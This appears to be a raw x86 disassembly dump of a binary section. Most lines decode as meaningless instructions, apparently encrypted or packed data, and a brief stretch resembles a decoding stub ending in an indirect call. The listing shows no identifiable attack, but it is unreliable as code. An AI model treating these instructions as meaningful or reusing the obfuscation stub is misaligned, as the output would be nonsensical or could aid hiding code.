  4161c6:	in     al,dx
  4161c7:	push   ss
  4161c8:	in     eax,dx
  4161c9:	mov    bh,0x50
  4161cb:	xchg   esp,eax
  4161cc:	add    DWORD PTR [esi+0x41],esi
  4161cf:	mov    ecx,0xce396d55
  4161d4:	ficomp DWORD PTR [eax]
  4161d6:	enter  0x1467,0xe2
  4161da:	xor    DWORD PTR [edx+0x7d],ebp
  4161dd:	push   ecx
  4161de:	les    ebp,FWORD PTR [edx+0x2d]
  4161e1:	dec    edx
  4161e2:	mov    esp,0xbe847bf0
  4161e7:	into   
  4161e8:	add    eax,0x90d8b155
  4161ed:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4161ee:	sbb    BYTE PTR [edx-0x7e],bl
  4161f1:	int    0xd6
  4161f3:	adc    eax,0xcbf9d00
  4161f8:	adc    BYTE PTR [ebx+0x678933c6],cl
  4161fe:	add    edi,esp
  416200:	js     0x416254
  416202:	ret    
  416203:	jmp    0xa9008fc2
  416208:	xchg   esp,eax
  416209:	mov    WORD PTR [ecx+0x7b],es
  41620c:	repnz and BYTE PTR [esi],al
  41620f:	xchg   ebx,eax
  416210:	sti    
  416211:	jg     0x4161bd
  416213:	leave  
  416214:	fsub   DWORD PTR [eax]
  416216:	jo     0x416251
  416218:	iret   
  416219:	repnz mov ah,0x17
  41621c:	outs   dx,DWORD PTR ds:[esi]
  41621d:	ss jge 0x4161c8
  416220:	aas    
  416221:	fcomp  DWORD PTR [eax]
  416223:	push   edx
  416224:	dec    ebx
  416225:	jg     0x41620c
  416227:	add    al,0x2f
  416229:	push   ecx
  41622a:	popa   
  41622b:	push   edi
  41622c:	ja     0x416210
  41622e:	hlt    
  41622f:	pcmpgtb mm3,mm7
  416232:	xchg   edi,eax
  416233:	xchg   ebx,eax
  416234:	(bad)  
  416235:	jbe    0x41628e
  416237:	mov    ebx,0x54752ec3
  41623c:	push   esi
  41623d:	(bad)  
  41623e:	fwait
  41623f:	idiv   DWORD PTR [edx-0x72]
  416242:	jp     0x416282
  416244:	(bad)  
  416245:	push   edi
  416246:	or     al,0x43
  416248:	xor    bh,BYTE PTR [edx+ebx*8-0x1a808307]
  41624f:	push   edx
  416250:	ins    BYTE PTR es:[edi],dx
  416251:	bound  esi,QWORD PTR [eax]
  416253:	ret    0xc9d2
  416256:	mov    BYTE PTR [ecx+0x6229227f],cl
  41625c:	push   0xfffffff1
  41625e:	mov    esp,0xd5c9b6f7
  416263:	mov    ecx,0x43dbb28f
  416268:	(bad)  
  416269:	in     al,dx
  41626a:	icebp  
  41626b:	mov    dh,0xeb
  41626d:	or     BYTE PTR [edi],bh
  41626f:	outs   dx,BYTE PTR ds:[esi]
  416270:	adc    DWORD PTR cs:[esi],ecx
  416273:	push   ss
  416274:	and    bl,BYTE PTR [edi-0x1c]
  416277:	stos   BYTE PTR es:[edi],al
  416278:	dec    edx
  416279:	outs   dx,BYTE PTR ds:[esi]
  41627a:	cwde   
  41627b:	icebp  
  41627c:	dec    edx
  41627d:	xor    DWORD PTR [ebp-0x25],ebp
  416280:	push   esp
  416281:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416282:	or     esi,DWORD PTR [esi-0x5d]
  416285:	pop    edi
  416286:	(bad)  
  416287:	add    al,0xf7
  416289:	test   al,0x1b
  41628b:	jns    0x416233
  41628d:	inc    ebp
  41628e:	mov    ?,WORD PTR fs:[eax-0x1646dece]
  416295:	push   ss
  416296:	out    dx,eax
  416297:	push   0x94e74431
  41629c:	(bad)  
  41629d:	retf   
  41629e:	push   cs
  41629f:	push   cs
  4162a0:	ja     0x4162a9
  4162a2:	daa    
  4162a3:	jge    0x416256
  4162a5:	dec    ebx
  4162a6:	aaa    
  4162a7:	shr    DWORD PTR [edx+0x66fdb1c4],0xd3
  4162ae:	out    dx,eax
  4162af:	cmp    BYTE PTR [eax-0x75],bl
  4162b2:	jg     0x416296
  4162b4:	sar    DWORD PTR [eax-0x7e4c4c7],0xd9
  4162bb:	in     al,dx
  4162bc:	sub    cl,BYTE PTR [edx]
  4162be:	xchg   esp,eax
  4162bf:	mov    ah,0x9
  4162c1:	mov    ds:0xd13fa00d,al
  4162c6:	mov    dh,BYTE PTR [ebp-0x498fe09e]
  4162cc:	adc    al,0x6f
  4162ce:	cli    
  4162cf:	(bad)  
  4162d0:	popa   
  4162d1:	xor    ecx,DWORD PTR [eax]
  4162d3:	iret   
  4162d4:	mov    ecx,0xcf937601
  4162d9:	sub    al,0x61
  4162db:	stc    
  4162dc:	push   esp
  4162dd:	dec    edx
  4162de:	mov    ds:0x29a71120,al
  4162e3:	xchg   esi,eax
  4162e4:	fwait
  4162e5:	stc    
  4162e6:	adc    eax,DWORD PTR [edi+0x76e4aaff]
  4162ec:	ds push es
  4162ee:	out    0xcf,al
  4162f0:	enter  0xd04b,0x9b
  4162f4:	jno    0x41628e
  4162f6:	jge    0x4162ec
  4162f8:	shr    dh,0x92
  4162fb:	push   esp
  4162fc:	test   eax,0xf72d30db
  416301:	loop   0x41632f
  416303:	leave  
  416304:	aaa    
  416305:	jl     0x41628b
  416307:	(bad)  
  416308:	jb     0x4162f9
  41630a:	add    eax,0x3e38a2a
  41630f:	or     eax,0xc7f8696a
  416314:	rol    BYTE PTR [edi],cl
  416316:	add    al,0x23
  416318:	sub    al,0x15
  41631a:	xchg   al,ah
  41631c:	mov    ah,0x2e
  41631e:	push   eax
  41631f:	popf   
  416320:	sar    DWORD PTR [esi],1
  416322:	jmp    0x4162c4
  416324:	int    0xd4
  416326:	jne    0x4162bd
  416328:	dec    esi
  416329:	fcomp  DWORD PTR [ebx]
  41632b:	mov    bh,cl
  41632d:	pop    ebx
  41632e:	dec    edx
  41632f:	aam    0xf3
  416331:	dec    ecx
  416332:	adc    DWORD PTR [esi+0x3c],edx
  416335:	cmp    bh,bl
  416337:	xchg   ebp,eax
  416338:	popa   
  416339:	pop    esp
  41633a:	adc    ch,BYTE PTR [ecx*1-0x1685c3d5]
  416341:	dec    edx
  416342:	sti    
  416343:	sahf   
  416344:	iret   
  416345:	push   ebp
  416346:	loop   0x4162f8
  416348:	add    edi,esp
  41634a:	or     eax,0xc52dc043
  41634f:	test   al,0xc2
  416351:	rol    DWORD PTR [edx+0x6dd20a44],0x60
  416358:	scas   eax,DWORD PTR es:[di]
  41635a:	push   edx
  41635b:	ja     0x416312
  41635d:	pop    ds
  41635e:	xchg   BYTE PTR [edx-0x41b0b45a],ch
  416364:	pop    ebp
  416365:	rcl    eax,1
  416367:	mov    esp,0x623dcbf5
  41636c:	mov    ecx,DWORD PTR [ebp+0x8]
  41636f:	lea    ecx,[edx+ecx*1+0x32729c]
  416376:	cmp    ecx,eax
  416378:	jne    0x4154a0
  41637e:	mov    ebx,esi
  416380:	jmp    0x41638a
  416385:	mov    ebx,0x32729c
  41638a:	mov    eax,DWORD PTR [ebp-0x4]
  41638d:	xor    eax,0x7510855
  416392:	add    eax,ebx
  416394:	mov    DWORD PTR [ebp-0xc],eax
  416397:	xor    ebx,ebx
  416399:	lea    eax,[ebp-0x10]
  41639c:	add    ebx,DWORD PTR [eax]
  41639e:	call   ebx
  4163a0:	xor    ebx,ebx
  4163a2:	inc    ebx
  4163a3:	cmp    DWORD PTR [ebp+0x10],ebx
  4163a6:	je     0x416f54
  4163ac:	jmp    0x416690
  4163b1:	or     al,0x9a
  4163b3:	shl    DWORD PTR [esi],1
  4163b5:	jno    0x41642c
  4163b7:	jmp    0x41636b
  4163b9:	lds    ecx,FWORD PTR ds:0x55acc841
  4163bf:	xchg   esi,eax
  4163c0:	out    dx,eax
  4163c1:	adc    edx,DWORD PTR [edi+edi*2]
  4163c4:	jo     0x41637f
  4163c6:	jle    0x416438
  4163c8:	jo     0x416434
  4163ca:	fsub   QWORD PTR [edi+0x1]
  4163cd:	shl    DWORD PTR [esp+eiz*8+0x5c],cl
  4163d1:	pop    es
  4163d2:	out    0x6c,al
  4163d4:	jmp    0xf0bf9866
  4163d9:	fnstenv [edi]
  4163db:	xchg   edi,eax
  4163dc:	xchg   edx,esp
  4163de:	pop    ecx
  4163df:	scas   eax,DWORD PTR es:[edi]
  4163e0:	push   0x7209c5b9
  4163e5:	in     eax,dx
  4163e6:	cmp    ecx,edi
  4163e8:	(bad)  
  4163e9:	mov    DWORD PTR [edi+eiz*4-0x426a9b62],edi
  4163f0:	fstp   TBYTE PTR [ebx]
  4163f2:	out    0xfc,al
  4163f4:	xor    ebp,DWORD PTR [edx+0x1]
  4163f7:	sub    al,0x8d
  4163f9:	mov    edi,DWORD PTR [esi+0x52]
  4163fc:	cld    
  4163fd:	ins    DWORD PTR es:[edi],dx
  4163fe:	js     0x416408
  416400:	scas   eax,DWORD PTR es:[edi]
  416401:	sbb    DWORD PTR [ecx-0x22],ecx
  416404:	sbb    al,0x9d
  416406:	pop    es
  416407:	das    
  416408:	clc    
  416409:	ja     0x416471
  41640b:	out    0xd,al
  41640d:	push   cs
  41640e:	sub    dl,BYTE PTR [ebx+esi*4-0x2eb9436]
  416415:	call   0xb267:0x5cc2ba71
  41641c:	mov    esi,0xf56c969f
  416421:	xor    edx,DWORD PTR [esi+0x22]
  416424:	mov    cl,0x5e
  416426:	les    eax,FWORD PTR [esi+edx*1]
  416429:	cmp    cl,dh
  41642b:	call   DWORD PTR [esi+edx*4-0x5d3bc239]
  416432:	sbb    edi,DWORD PTR [ebp+eiz*8-0x5d]
  416436:	sti    
  416437:	in     al,0xcd
  416439:	jno    0x41642a
  41643b:	(bad)  
  41643c:	inc    eax
  41643d:	sub    eax,0xac336e44
  416442:	sub    BYTE PTR [edi],bh
  416444:	cwde   
  416445:	inc    BYTE PTR [edx]
  416447:	mov    ebx,0x8a6bb26c
  41644c:	hlt    
  41644d:	repnz pop es
  41644f:	das    
  416450:	jle    0x4163fb
  416452:	and    ah,BYTE PTR [edi+0x46]
  416455:	inc    ebp
  416456:	push   esp
  416457:	outs   dx,BYTE PTR ds:[esi]
  416458:	std    
  416459:	outs   dx,BYTE PTR ds:[esi]
  41645a:	mov    ah,0xc4
  41645c:	dec    ecx
  41645d:	sub    bl,BYTE PTR [esi+eiz*8]
  416460:	jmp    0x39e2319c
  416465:	push   edx
  416466:	mov    eax,ds:0xeb1741
  41646b:	and    ebp,esi
  41646d:	popa   
  41646e:	inc    edi
  41646f:	mov    edi,0x589eaf2
  416474:	jb     0x416485
  416476:	stos   DWORD PTR es:[edi],eax
  416477:	ret    
  416478:	cmp    dh,bl
  41647a:	call   0x115a0e7c
  41647f:	sbb    ch,BYTE PTR [ebx]
  416481:	and    ecx,DWORD PTR [ebx+eiz*8+0x51c00e72]
  416488:	in     eax,0x81
  41648a:	test   BYTE PTR [ebp-0x70],al
  41648d:	sbb    ebx,DWORD PTR [ebx]
  41648f:	je     0x416503
  416491:	cmc    
  416492:	retf   0xea52
  416495:	inc    esi
  416496:	dec    ecx
  416497:	icebp  
  416498:	pop    edx
  416499:	dec    ecx
  41649a:	pop    esi
  41649b:	cmp    al,0x38
  41649d:	sub    eax,0x59cc808c
  4164a2:	js     0x4164e5
  4164a4:	enter  0x5f04,0xf0
  4164a8:	push   ecx
  4164a9:	and    BYTE PTR [ecx-0x5ba22c75],cl
  4164af:	fidivr DWORD PTR [eax]
  4164b1:	jp     0x4164e6
  4164b3:	jle    0x416509
  4164b5:	or     bh,BYTE PTR [eax+0x3bd50b10]
  4164bb:	pusha  
  4164bc:	fs push ebp
  4164be:	mov    bl,0x80
  4164c0:	cmp    DWORD PTR [ebp+0x783b9e61],esi
  4164c6:	sub    eax,0x48a79b78
  4164cb:	mov    esp,0xc9b1293e
  4164d0:	jb     0x416468
  4164d2:	inc    ebp
  4164d3:	cs pop bp
  4164d6:	fstp   DWORD PTR [eax]
  4164d8:	inc    ebx
  4164d9:	adc    edi,0x78235111
  4164df:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4164e0:	or     DWORD PTR [ecx+0x1944a9e3],esi
  4164e6:	sahf   
  4164e7:	test   edx,0x6829aa99
  4164ed:	ins    BYTE PTR es:[edi],dx
  4164ee:	xor    al,0x8e
  4164f0:	and    BYTE PTR [eax+0x42],ch
  4164f3:	cmc    
  4164f4:	push   ebx
  4164f5:	fs fwait
  4164f7:	push   0xffffffc2
  4164f9:	push   0x58c48262
  4164fe:	sub    al,0x15
  416500:	(bad)  
  416501:	jmp    0x62b1:0x42facb2f
  416508:	add    eax,0x5db65515
  41650d:	imul   edx,edx,0x1f8c9f50
  416513:	mov    eax,fs:0xbf04922b
  416519:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41651a:	dec    BYTE PTR [edi-0xa]
  41651d:	jb     0x416556
  41651f:	dec    esp
  416520:	mov    ss,WORD PTR [eax+0x2683ed89]
  416526:	inc    esp
  416527:	mov    esp,0x97794f6a
  41652c:	cli    
  41652d:	cmp    eax,0x81bf1da4
  416532:	sub    BYTE PTR [edi],bh
  416534:	test   BYTE PTR [edx],dh
  416536:	jle    0x416597
  416538:	ja     0x4165b1
  41653a:	inc    ebp
  41653b:	cmp    DWORD PTR [ebx+edi*4-0x40],ebx
  41653f:	or     eax,0xdc5786ce
  416544:	ret    0x44
  416547:	mov    cl,0xf3
  416549:	add    BYTE PTR [esi],bh
  41654b:	mov    edi,0x66e74103
  416550:	inc    ecx
  416551:	inc    ecx
  416552:	xchg   esp,eax
  416553:	or     edi,DWORD PTR [ecx+0x3e78fbb4]
  416559:	and    al,BYTE PTR [edx-0x71c62f3e]
  41655f:	sbb    BYTE PTR ds:0xc2fae35b,bl
  416565:	mov    ch,0x73
  416567:	popa   
  416568:	or     esp,esp
  41656a:	mov    esi,0x9c202bff
  41656f:	push   esp
  416570:	add    ebx,0x68
  416573:	jge    0x416547
  416575:	sbb    ebx,esp
  416577:	cs (bad) 
  416579:	mov    bl,0xfa
  41657b:	mov    ds:0x13822ce6,eax
  416580:	and    eax,0x4b5976de
  416585:	sub    DWORD PTR [eax-0x19c69612],edi
  41658b:	adc    dl,BYTE PTR [eax+0x24cba6ce]
  416591:	cwde   
  416592:	leave  
  416593:	shl    DWORD PTR [edi+0x5b],0x6f
  416597:	xchg   esi,eax
  416598:	xchg   DWORD PTR [ecx-0x4992bf33],ebx
  41659e:	sub    al,0x19
  4165a0:	sbb    eax,0x76a0c828
  4165a5:	out    0x8,al
  4165a7:	dec    edi
  4165a8:	jmp    0x41652f
  4165aa:	cmp    bl,BYTE PTR [ebp+0x1a]
  4165ad:	dec    ecx
  4165ae:	mov    ch,0xee
  4165b0:	xor    DWORD PTR [edx+0x7b],ebx
  4165b3:	jno    0x416586
  4165b5:	push   ds
  4165b6:	and    eax,0x9288771
  4165bb:	pop    esp
  4165bc:	sbb    BYTE PTR [edi],ch
  4165be:	push   0x55
  4165c0:	into   
  4165c1:	clc    
  4165c2:	sub    al,0xbb
  4165c4:	sbb    al,0x64
  4165c6:	fnstenv [eax-0x15]
  4165c9:	popa   
  4165ca:	jecxz  0x416552
  4165cc:	out    dx,eax
  4165cd:	push   cs
  4165ce:	and    bl,ah
  4165d0:	sub    al,0x84
  4165d2:	je     0x416580
  4165d4:	mov    bh,0x27
  4165d6:	xor    DWORD PTR [esi-0x1d],eax
  4165d9:	or     edi,DWORD PTR fs:[edx-0x62]
  4165dd:	xor    BYTE PTR ds:0x1dce4cce,bh
  4165e3:	jmp    0x41656e
  4165e5:	(bad)  
  4165e6:	jl     0x4165d2
  4165e8:	push   esi
  4165e9:	sbb    eax,0xb925272f
  4165ee:	stos   BYTE PTR es:[edi],al
  4165ef:	lods   eax,DWORD PTR ds:[esi]
  4165f0:	mov    esi,eax
  4165f2:	mov    dl,BYTE PTR [ecx+edi*4-0x6c]
  4165f6:	scas   eax,DWORD PTR es:[edi]
  4165f7:	inc    edx
  4165f8:	outs   dx,DWORD PTR ds:[esi]
  4165f9:	repnz aad 0x4f
  4165fc:	jmp    0xc782ffe2
  416601:	sbb    edx,DWORD PTR [eax-0x3a]
  416604:	pop    ebp
  416605:	and    DWORD PTR [esi],esi
  416607:	neg    BYTE PTR [esi]
  416609:	jo     0x4165e4
  41660b:	sub    BYTE PTR [ebx-0x2e],cl
  41660e:	sub    edi,DWORD PTR [esi]
  416610:	sub    DWORD PTR [esi+ecx*2],edx
  416613:	jl     0x416633
  416615:	fldcw  WORD PTR [edx-0x2e]
  416618:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416619:	fnstsw WORD PTR [ebx-0x2c7fdf6c]
  41661f:	bound  esi,QWORD PTR ds:0x26a5b238
  416625:	jnp    0x41662e
  416627:	jp     0x4165e4
  416629:	xor    BYTE PTR [ebp+0x32],al
  41662c:	or     dl,al
  41662e:	pushf  
  41662f:	in     eax,0x76
  416631:	icebp  
  416632:	lds    ecx,FWORD PTR [ebx]
  416634:	sahf   
  416635:	jns    0x416622
  416637:	mov    bh,0x7a
  416639:	int3   
  41663a:	mov    dl,0x16
  41663c:	(bad)  
  41663d:	out    0xfa,al
  41663f:	push   cs
  416640:	scas   al,BYTE PTR es:[edi]
  416641:	and    eax,0x4aa6e6bf
  416646:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416647:	arpl   ax,di
  416649:	scas   eax,DWORD PTR es:[edi]
  41664a:	ins    DWORD PTR es:[edi],dx
  41664b:	lock mov ch,0x1e
  41664e:	and    BYTE PTR [edi],ah
  416650:	and    dl,ch
  416652:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416653:	fnstsw WORD PTR [ecx-0x1c]
  416656:	mov    cl,0x3c
  416658:	adc    al,0x93
  41665a:	push   ebx
  41665b:	or     dl,BYTE PTR [ebx+0x7abaa169]
  416661:	int    0x5
  416663:	inc    edx
  416664:	mov    WORD PTR [edi],es
  416666:	fbld   TBYTE PTR [eax+0x36]
  416669:	ja     0x41669f
  41666b:	jp     0x4166e9
  41666d:	jns    0x416669
  41666f:	adc    eax,0xaf63080a
  416674:	jp     0x416662
  416676:	inc    eax
  416677:	xor    al,0x85
  416679:	and    eax,0x2db808d6
  41667e:	fild   DWORD PTR [esi]
  416680:	rcl    DWORD PTR [ebp-0x56],cl
  416683:	aas    
  416684:	jp     0x4166c9
  416686:	retf   
  416687:	pop    esi
  416688:	and    bl,BYTE PTR [edx-0x1da7f028]
  41668e:	lahf   
  41668f:	fcom   DWORD PTR [edx+0x6a590a6a]
  416695:	add    al,0x5b
  416697:	inc    ebx
  416698:	xchg   ebx,ecx
  41669a:	sub    ebx,ecx
  41669c:	jmp    0x416980
  4166a1:	cmc    
  4166a2:	icebp  
  4166a3:	retf   
  4166a4:	mov    ebp,0x717165cb
  4166a9:	test   BYTE PTR [ebx-0x79],dl
  4166ac:	jnp    0x41669d
  4166ae:	shr    ch,1
  4166b0:	jns    0x41670e
  4166b2:	adc    bh,BYTE PTR [edi+0x70]
  4166b5:	mov    ecx,0xf70707e
  4166ba:	push   edi
  4166bb:	iret   
  4166bc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4166bd:	ins    BYTE PTR es:[edi],dx
  4166be:	int3   
  4166bf:	jecxz  0x41670d
  4166c1:	or     BYTE PTR [ecx-0x2f3d00e2],0x3b
  4166c8:	inc    edi
  4166c9:	test   DWORD PTR [esi+edx*4],eax
  4166cc:	sbb    al,BYTE PTR gs:[edi-0x6757da10]
  4166d3:	shl    DWORD PTR [esp+ecx*2],0xf3
  4166d7:	dec    ebp
  4166d8:	fs adc dl,cl
  4166db:	mov    ebx,es
  4166dd:	repnz fs xchg esp,eax
  4166e0:	ror    DWORD PTR [eax+0x48],1
  4166e3:	xor    edi,ebx
  4166e5:	ja     0x4166a9
  4166e7:	or     BYTE PTR [edx+0x46],al
  4166ea:	adc    eax,0x5f37aaab
  4166ef:	dec    ebx
  4166f0:	xor    cl,0xae
  4166f3:	test   eax,0x69ebf424
  4166f8:	cmp    DWORD PTR [edx+esi*2],esi
  4166fb:	mov    ecx,0x358c3771
  416700:	out    dx,al
  416701:	and    DWORD PTR [edi],edx
  416703:	sbb    DWORD PTR [ecx+0x27],esp
  416706:	pop    ebx
  416707:	adc    BYTE PTR [edx+ebp*1-0x56],bh
  41670b:	jo     0x416726
  41670d:	pop    edi
  41670e:	pop    DWORD PTR [ebx-0x6b]
  416711:	jb     0x41671e
  416713:	or     al,0xb0
  416715:	or     al,0xde
  416717:	leave  
  416718:	lods   eax,DWORD PTR ds:[esi]
  416719:	mov    al,0x46
  41671b:	in     al,0xe2
  41671d:	fisub  DWORD PTR [eax+ebx*1]
  416720:	scas   al,BYTE PTR es:[edi]
  416721:	mov    edx,0x4b0e0ce4
  416726:	jle    0x4166b5
  416728:	in     eax,0xa
  41672a:	fcomp  st(4)
  41672c:	mov    ebx,0x75d81820
  416731:	sub    al,0x6a
  416733:	sbb    ecx,DWORD PTR [eax+0x0]
  416736:	push   esi
  416737:	or     al,0xe7
  416739:	adc    ebx,DWORD PTR [ecx+eax*8-0x414581ad]
  416740:	lock push 0xffffffb2
  416743:	mov    dl,0x66
  416745:	(bad)  
  416746:	scas   al,BYTE PTR es:[edi]
  416747:	add    BYTE PTR [edx+0x5a],bl
  41674a:	int    0xa7
  41674c:	repz mov ecx,0x1a1fdf56
  416752:	retf   
  416753:	mov    esp,0x62efe63f
  416758:	xor    eax,0x9950850f
  41675d:	cmova  edi,DWORD PTR [eax-0xd]
  416761:	inc    ebx
  416762:	ficomp WORD PTR [eax]
  416764:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416765:	cmp    esi,ebp
  416767:	pop    ds
  416768:	mov    al,0x7a
  41676a:	push   cs
  41676b:	pop    ebx
  41676c:	bound  ecx,QWORD PTR [ecx-0x24d4ba85]
  416772:	push   es
  416773:	hlt    
  416774:	(bad)  
  416776:	jle    0x416705
  416778:	pop    esi
  416779:	stos   BYTE PTR es:[edi],al
  41677a:	jmp    0xcfe06a71
  41677f:	jge    0x416702
  416781:	cs (bad) 
  416783:	nop
  416784:	cli    
  416785:	cmp    BYTE PTR [edx],cl
  416787:	sbb    esi,DWORD PTR [ecx+0x3f]
  41678a:	sub    al,BYTE PTR [eax-0x3953be47]
  416790:	stos   DWORD PTR es:[edi],eax
  416791:	inc    esp
  416792:	call   0x3f5eed0e
  416797:	and    al,0x34
  416799:	call   0xdfbb:0x9dc563dd
  4167a0:	inc    eax
  4167a1:	sahf   
  4167a2:	stc    
  4167a3:	mov    dh,0x1f
  4167a5:	xchg   ecx,eax
  4167a6:	sub    esi,eax
  4167a8:	arpl   WORD PTR [edi],bx
  4167aa:	push   ebx
  4167ab:	cli    
  4167ac:	in     eax,dx
  4167ad:	sbb    edx,DWORD PTR [esi-0x1730c409]
  4167b3:	push   ebx
  4167b4:	sbb    BYTE PTR [esi],0x97
  4167b7:	and    BYTE PTR cs:[edx+0x77c19a7d],cl
  4167be:	push   eax
  4167bf:	xchg   DWORD PTR [ebp-0x50993c55],eax
  4167c5:	xchg   DWORD PTR [edx-0x212f94ed],esp
  4167cb:	dec    edi
  4167cc:	aaa    
  4167cd:	mov    ds:0x31851467,al
  4167d2:	bound  edi,QWORD PTR ds:0x462609ef
  4167d8:	push   cs
  4167d9:	aas    
  4167da:	(bad)  
  4167db:	mov    ah,0x55
  4167dd:	jo     0x416827
  4167df:	sahf   
  4167e0:	xchg   edi,eax
  4167e1:	push   0x98147940
  4167e6:	push   ss
  4167e7:	xchg   edi,eax
  4167e8:	push   0xffffffc2
  4167ea:	pop    ebp
  4167eb:	aaa    
  4167ec:	sbb    BYTE PTR [esi],bh
  4167ee:	xchg   ebp,eax
  4167ef:	repnz into 
  4167f1:	(bad)
  4167f4:	pop    ebp
  4167f5:	xchg   ebx,eax
  4167f6:	lahf   
  4167f7:	in     eax,dx
  4167f8:	jnp    0x416825
  4167fa:	bound  edi,QWORD PTR [ebx]
  4167fc:	fs loop 0x4167e0
  4167ff:	jle    0x41682d
  416801:	out    0xb0,eax
  416803:	test   al,0x81
  416805:	jle    0x41683b
  416807:	xchg   esi,eax
  416808:	enter  0xdd3b,0xc3
  41680c:	sub    al,BYTE PTR [eax]
  41680e:	push   0xffffffde
  416810:	bound  edi,QWORD PTR [edi-0x18]
  416813:	mov    ebx,0x88a01f20
  416818:	xor    edi,esi
  41681a:	cmp    BYTE PTR ds:0xfd5f66b2,al
  416820:	pop    edi
  416821:	or     al,0xc3
  416823:	sbb    BYTE PTR [edi-0x68798f91],dh
  416829:	mov    eax,0x8aa9eb48
  41682e:	cmp    eax,0x24b242c1
  416833:	fimul  DWORD PTR [edi]
  416835:	xchg   ecx,eax
  416836:	push   ds
  416837:	das    
  416838:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416839:	push   0xe6797d16
  41683e:	and    esi,DWORD PTR [edx]
  416840:	xlat   BYTE PTR ds:[ebx]
  416841:	mov    ds:0x1fabd322,al
  416846:	enter  0x1c86,0xb6
  41684a:	dec    edx
  41684b:	int    0xcc
  41684d:	xchg   ecx,eax
  41684e:	sti    
  41684f:	bound  ecx,QWORD PTR [eax]
  416851:	mov    esi,0x2cc915ca
  416856:	mov    ah,0x2
  416858:	stos   DWORD PTR es:[edi],eax
  416859:	inc    esi
  41685a:	jne    0x4168a4
  41685c:	adc    BYTE PTR [edx],cl
  41685e:	cmp    eax,0x1a220083
  416863:	jg     0x416885
  416865:	out    dx,eax
  416866:	imul   ebx,DWORD PTR [eax+0x7],0xffffffc6
  41686a:	add    dh,BYTE PTR [eax]
  41686c:	mov    bh,0xce
  41686e:	push   es
  41686f:	inc    edx
  416870:	scas   eax,DWORD PTR es:[edi]
  416871:	push   ebp
  416872:	and    BYTE PTR [ebx-0x1910cf05],ch
  416878:	inc    edi
  416879:	in     eax,dx
  41687a:	in     eax,0x32
  41687c:	repnz loope 0x4168db
  41687f:	fiadd  DWORD PTR [eax+0x63492ad9]
  416885:	mov    ah,0xf8
  416887:	jmp    0x41686c
  416889:	pop    edi
  41688a:	and    ecx,DWORD PTR [esi]
  41688c:	mov    ds:0x81b2d720,eax
  416891:	mov    al,bl
  416893:	outs   dx,DWORD PTR ds:[esi]
  416894:	and    edx,ebx
  416896:	fdivr  st,st(3)
  416898:	out    0x55,eax
  41689a:	js     0x4168c1
  41689c:	sbb    eax,0xe9f2abb9
  4168a1:	mov    al,0xbb
  4168a3:	in     eax,dx
  4168a4:	das    
  4168a5:	int3   
  4168a6:	les    esp,FWORD PTR [eax-0x752f76fb]
  4168ac:	aad    0xd7
  4168ae:	daa    
  4168af:	sbb    al,0xdb
  4168b1:	sub    ebp,eax
  4168b3:	or     dl,cl
  4168b5:	push   cs
  4168b6:	dec    ebx
  4168b7:	jne    0x4168d7
  4168b9:	imul   BYTE PTR [eax-0x3d8a81b3]
  4168bf:	ret    
  4168c0:	lods   al,BYTE PTR ds:[esi]
  4168c1:	int3   
  4168c2:	mov    ss,WORD PTR ds:0x9db9327a
  4168c8:	loope  0x4168b2
  4168ca:	xchg   esp,eax
  4168cb:	jl     0x4168dd
  4168cd:	out    0x63,al
  4168cf:	inc    edx
  4168d0:	adc    DWORD PTR [ebx-0x6f7d7149],ecx
  4168d6:	scas   al,BYTE PTR es:[edi]
  4168d7:	jle    0x4168a3
  4168d9:	jnp    0x4168b4
  4168db:	stos   BYTE PTR es:[edi],al
  4168dc:	les    ebp,FWORD PTR [ebp+0x1f20a1a5]
  4168e2:	xor    al,0x9
  4168e4:	in     al,0x12
  4168e6:	enter  0x6a5d,0x87
  4168ea:	loope  0x4168dc
  4168ec:	mov    eax,ds:0x468a88c5
  4168f1:	xor    dh,ch
  4168f3:	repz or esi,esi
  4168f6:	ret    0xeda2
  4168f9:	push   ecx
  4168fa:	mov    fs,WORD PTR [eax]
  4168fc:	aas    
  4168fd:	cwde   
  4168fe:	inc    ebp
  4168ff:	cmp    BYTE PTR [eax+esi*1-0x6dac32b1],bl
  416906:	cli    
  416907:	fsubr  DWORD PTR [edx+0x58aa895b]
  41690d:	jmp    0xa2191eaa
  416912:	xor    BYTE PTR [edi-0x298f96ac],0x77
  416919:	or     edx,DWORD PTR [eax-0x29]
  41691c:	popa   
  41691d:	lods   eax,DWORD PTR ds:[esi]
  41691e:	xchg   edx,eax
  41691f:	aam    0x31
  416921:	cli    
  416922:	sbb    esp,DWORD PTR [eax]
  416924:	pushf  
  416925:	mov    dl,0x0
  416927:	xlat   BYTE PTR ds:[ebx]
  416928:	sub    bl,BYTE PTR [eax-0x343cec12]
  41692e:	push   ecx
  41692f:	clc    
  416930:	adc    al,0xcc
  416932:	data16 cmp BYTE PTR [eax-0x56],dl
  416936:	into   
  416937:	sbb    DWORD PTR [ebx],0x38
  41693a:	test   ebp,edi
  41693c:	test   BYTE PTR [ecx+0x5628cee3],0x99
  416943:	jnp    0x41695e
  416945:	call   0xc72e7aed
  41694a:	shr    bl,0x2f
  41694d:	cli    
  41694e:	jmp    0x4169b4
  416950:	stos   DWORD PTR es:[edi],eax
  416951:	mov    al,0xa
  416953:	test   eax,0xc19adcfd
  416958:	pop    edi
  416959:	mov    dh,0x42
  41695b:	or     BYTE PTR ds:0xa7408096,al
  416961:	adc    ebx,DWORD PTR ds:0xad9fc963
  416967:	jmp    0xe861281f
  41696c:	pop    ss
  41696d:	sub    al,0x75
  41696f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416970:	(bad)  
  416971:	in     al,0x22
  416973:	jp     0x416922
  416975:	stc    
  416976:	inc    esi
  416977:	xor    ebx,ecx
  416979:	jmp    0x962:0xa908dac6
  416980:	xchg   ebx,ecx
  416982:	jmp    0x416c66
  416987:	cmc    
  416988:	std    
  416989:	fs mov ah,0x74
  41698c:	jno    0x416983
  41698e:	mov    ecx,0x2f2f76b9
  416993:	sub    ah,ah
